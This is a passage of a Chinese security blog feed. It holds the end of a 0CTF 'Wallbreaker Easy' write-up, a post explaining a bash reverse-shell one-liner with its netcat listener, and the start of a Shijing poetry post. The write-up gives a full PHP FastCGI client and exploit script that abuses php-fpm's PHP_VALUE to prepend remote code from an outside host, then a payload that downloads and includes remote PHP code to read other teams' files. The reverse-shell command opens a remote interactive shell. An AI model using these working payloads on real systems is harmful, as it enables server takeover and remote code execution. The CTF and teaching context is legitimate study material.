class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_keepAlive;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a connection to the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_sock = fsockopen(<span class="keyword">$this</span>-&gt;_host, <span class="keyword">$this</span>-&gt;_port, $errno, $errstr, <span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'Unable to connect to FastCGI application'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build a FastCGI packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $type Type of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $content Content of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $requestId RequestId</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span><span class="params">($type, $content, $requestId = <span class="number">1</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $clen = strlen($content);</span><br><span class="line">        <span class="keyword">return</span> chr(<span class="keyword">self</span>::VERSION_1)         <span class="comment">/* version */</span></span><br><span class="line">            . chr($type)                    <span class="comment">/* type */</span></span><br><span class="line">            . chr(($requestId &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="comment">/* requestIdB1 */</span></span><br><span class="line">            . chr($requestId &amp; <span class="number">0xFF</span>)        <span class="comment">/* requestIdB0 */</span></span><br><span class="line">            . chr(($clen &gt;&gt; <span class="number">8</span> ) &amp; <span class="number">0xFF</span>)     <span class="comment">/* contentLengthB1 */</span></span><br><span class="line">            . chr($clen &amp; <span class="number">0xFF</span>)             <span class="comment">/* contentLengthB0 */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* paddingLength */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* reserved */</span></span><br><span class="line">            . $content;                     <span class="comment">/* content */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build an FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $name Name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $value Value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span><span class="params">($name, $value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $nlen = strlen($name);</span><br><span class="line">        $vlen = strlen($value);</span><br><span class="line">        <span class="keyword">if</span> ($nlen &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB0 */</span></span><br><span class="line">            $nvpair = chr($nlen);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line">            $nvpair = chr(($nlen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr(($nlen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr(($nlen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr($nlen &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($vlen &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB0 */</span></span><br><span class="line">            $nvpair .= chr($vlen);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line">            $nvpair .= chr(($vlen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr(($vlen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr(($vlen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr($vlen &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* nameData &amp; valueData */</span></span><br><span class="line">        <span class="keyword">return</span> $nvpair . $name . $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a set of FastCGI Name value pairs</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data Data containing the set of FastCGI NVPair</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array of NVPair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readNvpair</span><span class="params">($data, $length = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $array = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> ($length === <span class="keyword">null</span>) &#123;</span><br><span class="line">            $length = strlen($data);</span><br><span class="line">        &#125;</span><br><span class="line">        $p = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ($p != $length) &#123;</span><br><span class="line">            $nlen = ord($data&#123;$p++&#125;);</span><br><span class="line">            <span class="keyword">if</span> ($nlen &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                $nlen = ($nlen &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            $vlen = ord($data&#123;$p++&#125;);</span><br><span class="line">            <span class="keyword">if</span> ($vlen &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                $vlen = ($nlen &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);</span><br><span class="line">            $p += ($nlen + $vlen);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $array;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Decode a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data String containing all the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">decodePacketHeader</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ret = <span class="keyword">array</span>();</span><br><span class="line">        $ret[<span class="string">'version'</span>]       = ord($data&#123;<span class="number">0</span>&#125;);</span><br><span class="line">        $ret[<span class="string">'type'</span>]          = ord($data&#123;<span class="number">1</span>&#125;);</span><br><span class="line">        $ret[<span class="string">'requestId'</span>]     = (ord($data&#123;<span class="number">2</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord($data&#123;<span class="number">3</span>&#125;);</span><br><span class="line">        $ret[<span class="string">'contentLength'</span>] = (ord($data&#123;<span class="number">4</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord($data&#123;<span class="number">5</span>&#125;);</span><br><span class="line">        $ret[<span class="string">'paddingLength'</span>] = ord($data&#123;<span class="number">6</span>&#125;);</span><br><span class="line">        $ret[<span class="string">'reserved'</span>]      = ord($data&#123;<span class="number">7</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readPacket</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($packet = fread(<span class="keyword">$this</span>-&gt;_sock, <span class="keyword">self</span>::HEADER_LEN)) &#123;</span><br><span class="line">            $resp = <span class="keyword">$this</span>-&gt;decodePacketHeader($packet);</span><br><span class="line">            $resp[<span class="string">'content'</span>] = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">if</span> ($resp[<span class="string">'contentLength'</span>]) &#123;</span><br><span class="line">                $len  = $resp[<span class="string">'contentLength'</span>];</span><br><span class="line">                <span class="keyword">while</span> ($len &amp;&amp; $buf=fread(<span class="keyword">$this</span>-&gt;_sock, $len)) &#123;</span><br><span class="line">                    $len -= strlen($buf);</span><br><span class="line">                    $resp[<span class="string">'content'</span>] .= $buf;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($resp[<span class="string">'paddingLength'</span>]) &#123;</span><br><span class="line">                $buf=fread(<span class="keyword">$this</span>-&gt;_sock, $resp[<span class="string">'paddingLength'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $resp;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get Informations on the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $requestedInfo information to retrieve</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValues</span><span class="params">(array $requestedInfo)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connect();</span><br><span class="line">        $request = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($requestedInfo <span class="keyword">as</span> $info) &#123;</span><br><span class="line">            $request .= <span class="keyword">$this</span>-&gt;buildNvpair($info, <span class="string">''</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;_sock, <span class="keyword">$this</span>-&gt;buildPacket(<span class="keyword">self</span>::GET_VALUES, $request, <span class="number">0</span>));</span><br><span class="line">        $resp = <span class="keyword">$this</span>-&gt;readPacket();</span><br><span class="line">        <span class="keyword">if</span> ($resp[<span class="string">'type'</span>] == <span class="keyword">self</span>::GET_VALUES_RESULT) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;readNvpair($resp[<span class="string">'content'</span>], $resp[<span class="string">'length'</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'Unexpected response type, expecting GET_VALUES_RESULT'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute a request to the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $params Array of parameters</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $stdin Content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span><span class="params">(array $params, $stdin)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $response = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connect();</span><br><span class="line">        $request = <span class="keyword">$this</span>-&gt;buildPacket(<span class="keyword">self</span>::BEGIN_REQUEST, chr(<span class="number">0</span>) . chr(<span class="keyword">self</span>::RESPONDER) . chr((int) <span class="keyword">$this</span>-&gt;_keepAlive) . str_repeat(chr(<span class="number">0</span>), <span class="number">5</span>));</span><br><span class="line">        $paramsRequest = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($params <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            $paramsRequest .= <span class="keyword">$this</span>-&gt;buildNvpair($key, $value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($paramsRequest) &#123;</span><br><span class="line">            $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="keyword">self</span>::PARAMS, $paramsRequest);</span><br><span class="line">        &#125;</span><br><span class="line">        $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="keyword">self</span>::PARAMS, <span class="string">''</span>);</span><br><span class="line">        <span class="keyword">if</span> ($stdin) &#123;</span><br><span class="line">            $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="keyword">self</span>::STDIN, $stdin);</span><br><span class="line">        &#125;</span><br><span class="line">        $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="keyword">self</span>::STDIN, <span class="string">''</span>);</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;_sock, $request);</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $resp = <span class="keyword">$this</span>-&gt;readPacket();</span><br><span class="line">            <span class="keyword">if</span> ($resp[<span class="string">'type'</span>] == <span class="keyword">self</span>::STDOUT || $resp[<span class="string">'type'</span>] == <span class="keyword">self</span>::STDERR) &#123;</span><br><span class="line">                $response .= $resp[<span class="string">'content'</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> ($resp &amp;&amp; $resp[<span class="string">'type'</span>] != <span class="keyword">self</span>::END_REQUEST);</span><br><span class="line">        var_dump($resp);</span><br><span class="line">        <span class="keyword">if</span> (!is_array($resp)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'Bad request'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (ord($resp[<span class="string">'content'</span>]&#123;<span class="number">4</span>&#125;)) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="keyword">self</span>::CANT_MPX_CONN:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'This app can\'t multiplex [CANT_MPX_CONN]'</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="keyword">self</span>::OVERLOADED:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'New request rejected; too busy [OVERLOADED]'</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="keyword">self</span>::UNKNOWN_ROLE:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'Role value not known [UNKNOWN_ROLE]'</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="keyword">self</span>::REQUEST_COMPLETE:</span><br><span class="line">                <span class="keyword">return</span> $response;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// real exploit start here</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Check your input\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_REQUEST[<span class="string">'filepath'</span>])) &#123;</span><br><span class="line">    $filepath = <span class="keyword">__FILE__</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $filepath = $_REQUEST[<span class="string">'filepath'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$req = <span class="string">'/'</span>.basename($filepath);</span><br><span class="line">$uri = $req .<span class="string">'?'</span>.<span class="string">'command='</span>.$_REQUEST[<span class="string">'cmd'</span>];</span><br><span class="line">$client = <span class="keyword">new</span> FCGIClient(<span class="string">"unix:///var/run/php/php7.2-fpm.sock"</span>, <span class="number">-1</span>);</span><br><span class="line">$code = <span class="string">"&lt;?php echo(\$_REQUEST['command']);?&gt;"</span>; <span class="comment">// php payload</span></span><br><span class="line"><span class="comment">//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";</span></span><br><span class="line">$php_value = <span class="string">"allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://kaibro.tw/gginin"</span>;</span><br><span class="line">$params = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'GATEWAY_INTERFACE'</span> =&gt; <span class="string">'FastCGI/1.0'</span>,</span><br><span class="line">        <span class="string">'REQUEST_METHOD'</span>    =&gt; <span class="string">'POST'</span>,</span><br><span class="line">        <span class="string">'SCRIPT_FILENAME'</span>   =&gt; $filepath,</span><br><span class="line">        <span class="string">'SCRIPT_NAME'</span>       =&gt; $req,</span><br><span class="line">        <span class="string">'QUERY_STRING'</span>      =&gt; <span class="string">'command='</span>.$_REQUEST[<span class="string">'cmd'</span>],</span><br><span class="line">        <span class="string">'REQUEST_URI'</span>       =&gt; $uri,</span><br><span class="line">        <span class="string">'DOCUMENT_URI'</span>      =&gt; $req,</span><br><span class="line"><span class="comment">#'DOCUMENT_ROOT'     =&gt; '/',</span></span><br><span class="line">        <span class="string">'PHP_VALUE'</span>         =&gt; $php_value,</span><br><span class="line">        <span class="string">'SERVER_SOFTWARE'</span>   =&gt; <span class="string">'80sec/wofeiwo'</span>,</span><br><span class="line">        <span class="string">'REMOTE_ADDR'</span>       =&gt; <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'REMOTE_PORT'</span>       =&gt; <span class="string">'9985'</span>,</span><br><span class="line">        <span class="string">'SERVER_ADDR'</span>       =&gt; <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'SERVER_PORT'</span>       =&gt; <span class="string">'80'</span>,</span><br><span class="line">        <span class="string">'SERVER_NAME'</span>       =&gt; <span class="string">'localhost'</span>,</span><br><span class="line">        <span class="string">'SERVER_PROTOCOL'</span>   =&gt; <span class="string">'HTTP/1.1'</span>,</span><br><span class="line">        <span class="string">'CONTENT_LENGTH'</span>    =&gt; strlen($code)</span><br><span class="line">        );</span><br><span class="line"><span class="comment">// print_r($_REQUEST);</span></span><br><span class="line"><span class="comment">// print_r($params);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Call: $uri\n\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> strstr($client-&gt;request($params, $code), <span class="string">"PHP Version"</span>, <span class="keyword">true</span>).<span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后就可以阅读任何文件了，利用后发现可以阅读其他队伍的文件，直接利用一波</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">backdoor&#x3D;</span><br><span class="line">var_dump(file_put_contents(&quot;&#x2F;tmp&#x2F;42126aff4925d8592d6042ae2b81de08&#x2F;a.php&quot;, file_get_contents(&quot;http:&#x2F;&#x2F;kaibro.tw&#x2F;ext2&quot;)));</span><br><span class="line">include(&quot;&#x2F;tmp&#x2F;42126aff4925d8592d6042ae2b81de08&#x2F;a.php&quot;);</span><br><span class="line"></span><br><span class="line">var_dump(file_get_contents(&quot;&#x2F;tmp&#x2F;xxxxxxxx&#x2F;flag111.txt&quot;));</span><br></pre></td></tr></table></figure><p>得到flag</p><p>ps：此方法适应于绕过在服务器端的限制，对于在php代码处的限制没用</p><p>enable_dl如果是on，也可以用dl()函数加载扩展来绕过disable_functions,但是在php的5.3里sapi将此函数移除了。</p><h2 id="参考文献及链接"><a href="#参考文献及链接" class="headerlink" title="参考文献及链接"></a>参考文献及链接</h2><p><a href="https://gist.github.com/wofeiwo/4f41381a388accbf91f8" target="_blank" rel="noopener">https://gist.github.com/wofeiwo/4f41381a388accbf91f8</a></p><p><a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy" target="_blank" rel="noopener">https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy</a></p><p><a href="http://momomoxiaoxi.com/2019/03/26/tctf2019/#wallbreaker-easy" target="_blank" rel="noopener">http://momomoxiaoxi.com/2019/03/26/tctf2019/#wallbreaker-easy</a></p><p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html#0x02-directoryiterator-glob" target="_blank" rel="noopener">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html#0x02-directoryiterator-glob</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0ctf-web-Wallbreaker-Easy&quot;&gt;&lt;a href=&quot;#0ctf-web-Wallbreaker-Easy&quot; class=&quot;headerlink&quot; title=&quot;0ctf web Wallbreaker Easy&quot;&gt;&lt;/a&gt;0ctf web Wa
      
    
    </summary>
    
    
    
      <category term="0ctf" scheme="https://knightswd.github.io/tags/0ctf/"/>
    
      <category term="phpcgi" scheme="https://knightswd.github.io/tags/phpcgi/"/>
    
  </entry>
  
  <entry>
    <title>反弹shell命令解析</title>
    <link href="https://knightswd.github.io/2019/04/02/%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4%E8%A7%A3%E6%9E%90/"/>
    <id>https://knightswd.github.io/2019/04/02/%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4%E8%A7%A3%E6%9E%90/</id>
    <published>2019-04-02T13:53:03.000Z</published>
    <updated>2019-04-02T14:29:22.614Z</updated>
    
    <content type="html"><![CDATA[<p>以前做题时经常发现大佬用一行命令getshell，虽然自己有时侯也在用，但是并不知道到底为什么用这个命令。今天，我想去理解下为什么用这个命令getshell。</p><p>getshell的命令是：</p><blockquote><p>bash -i &gt;&amp; /dev/tcp/192.168.174.128/6666 0&gt;&amp;1</p></blockquote><p>nc的监听命令是：</p><blockquote><p>Nc -lvvp  6666</p></blockquote><p><code>bash -i</code>意思是交互式执行bash命令</p><p>而<code>&amp;</code>这个字符的作用是在后台工作,单一个&amp; 符号，且放在完整指令列的最后端，即表示将该指令列放入后台中工作。</p><p><code>cmd \&gt;&amp;n</code>把输出送到文件描述符n(n=0、1、2)</p><p>下面我们看下linux中常用的文件描述符有哪些：</p><p>​    文件描述符(File Descriptor)，用一个数字（通常为0-9）来表示一个文件。常用的文件描述符如下：<br>​    文件描述符          名称         常用缩写     默认值<br>             0               标准输入      stdin            键盘<br>​               1               标准输出      stdout         屏幕<br>             2            标准错误输出   stderr          屏幕</p><p>命令中的文件<code>/dev/tcp/192.168.174.128/6666</code>其实并不存在，这里的作用是发出一个socket连接，ip地址是192.168.174.128，端口是6666，读写这个文件就相当于在这个socket连接中传输数据。</p><p>而整个命令的意思是：和ip为192.168.174.128，端口为6666的电脑建立tcp连接，并将tcp传来的数据写入键盘并执行shell命令，而且不显示在窗口。</p><hr><p>下面再加一些Linux的特殊符号的意义：</p><p>查找文件用<code>find / -name .bash_history</code>查找整个磁盘<br><code>tab</code>接在第一个字后面则为命令补全，接在第二个字后面是文件名补齐<br><code>ls -al</code>目录下所有文件及属性<br><code>\</code>后是转义，可以\后加<code>enter</code>继续下一行执行<br><code>~</code> 帐户的 home 目录<br><code>~+</code>当前的工作目录，这个符号代表当前的工作目录，它和内建指令<code>pwd</code>的作用是相同的。<br><code>|</code>管道 (pipeline)是 UNIX 系统基础且重要的观念。连结上个指令的标准输出，做为下个指令的标准输入    <code>\&gt;file</code>如果文件存在就清空原文件，加上数据<br><code>\&gt;&gt;file</code> 在文件后面追加数据</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;以前做题时经常发现大佬用一行命令getshell，虽然自己有时侯也在用，但是并不知道到底为什么用这个命令。今天，我想去理解下为什么用这个命令getshell。&lt;/p&gt;
&lt;p&gt;getshell的命令是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;bash -i &amp;gt;&amp;amp
      
    
    </summary>
    
    
    
      <category term="ctf" scheme="https://knightswd.github.io/tags/ctf/"/>
    
      <category term="Linux命令" scheme="https://knightswd.github.io/tags/Linux%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>诗经</title>
    <link href="https://knightswd.github.io/2019/03/27/%E8%AF%97%E7%BB%8F/"/>
    <id>https://knightswd.github.io/2019/03/27/%E8%AF%97%E7%BB%8F/</id>
    <published>2019-03-27T12:38:44.000Z</published>
    <updated>2019-03-27T13:36:42.058Z</updated>
    
    <content type="html"><![CDATA[<p>淇奥</p><p><strong>诗经·国风·卫风·淇奥</strong></p><p>　瞻彼淇奥，绿竹猗猗。有匪君子，如切如磋，如琢如磨。瑟兮僩兮，赫兮咺兮。有匪君子，终不可谖兮。</p><p>　瞻彼淇奥，绿竹青青。有匪君子，充耳琇莹，会弁如星。瑟兮僩兮，赫兮咺兮。有匪君子，终不可谖兮。</p><p>　瞻彼淇奥，绿竹如箦。有匪君子，如金如锡，如圭如璧。宽兮绰兮，猗重较兮。善戏谑兮，不为虐兮。</p><p><strong>大意：</strong></p><p>　远望弯弯淇河旁，绿竹青翠叶婆娑。</p><p>　　文采奕奕那君子，好像细切细磋过，似已精琢细磨。</p><p>　　光彩照人多勇武，德行显赫美名播。</p><p>　　文采奕奕那君子，永不忘却记在心。</p><p>　　远望弯曲淇水岸，绿竹青翠叶婆娑。</p><p>　　文采奕奕那君子，美玉充耳光闪烁，帽缝镶玉如星火。</p><p>　　光彩照人多威猛，德业显赫美名播。</p><p>　　文采奕奕那君子，永不忘却记心窝。</p><p>　　远望弯曲淇河岸，绿竹有如栅栏密。</p><p>　　文采奕奕那君子，德行精纯如金锡，高贵如同圭和璧。</p><p>　　心胸开阔多美好，斜倚重较在车里。</p><p>　　善于诙谐来谈笑，却不刻薄把人欺。</p><p><strong>赏析：</strong></p><p>这首诗描述了一个女子对一个男子的仰慕之情，在女子眼中男子是那么的完美，她恨不得把世见所有美好的词汇拿来修饰他，他的外貌仿佛是精雕细琢的象牙雕刻，又像细细琢磨过的美玉配饰，光彩照人；那男子的打扮是如此的温而儒雅，美玉等身，衣服华美；那男子的姿态，更是美妙绝伦，贵公子姿态优雅地轻轻靠在轿栏杆处，与人温言谈笑，那画面是如此的美妙和谐，如此的让人迷恋。但是这美好与作者何干呢，“终不可谖兮”这句话表达出作者心中那对男子极度的喜欢，但是却又得不到的悲伤。心中如此喜欢却只能放在心房中独自想念。</p><p><strong>诗经·周南·汉广</strong></p><p>南有乔木，不可休思。汉有游女，不可求思。汉之广矣，不可泳思。江之永矣，不可方思。翘翘错薪，言刈其楚。之子于归，言秣其马。汉之广矣，不可泳思。江之永矣，不可方思。翘翘错薪，言刈其蒌。之子于归。言秣其驹。汉之广矣，不可泳思。江之永矣，不可方思。</p><p><strong>翻译：</strong></p><p>南山乔木大又高， 树下不可歇阴凉。汉江之上有游女， 想去追求不可能。汉江滔滔宽又广， 想要渡过不可能。江水悠悠长又长， 乘筏渡过不可能。</p><p>柴草丛丛错杂生， 用刀割取那荆条。姑娘就要出嫁了， 赶快喂饱她的马。汉江滔滔宽又广， 想要渡过不可能。江水悠悠长又长， 乘筏渡过不可能。</p><p>柴草丛丛错杂生， 用刀割取那蒌蒿。姑娘就要出嫁了， 赶快喂饱小马驹。汉江滔滔宽又广， 想要渡过不可能。江水悠悠长又长， 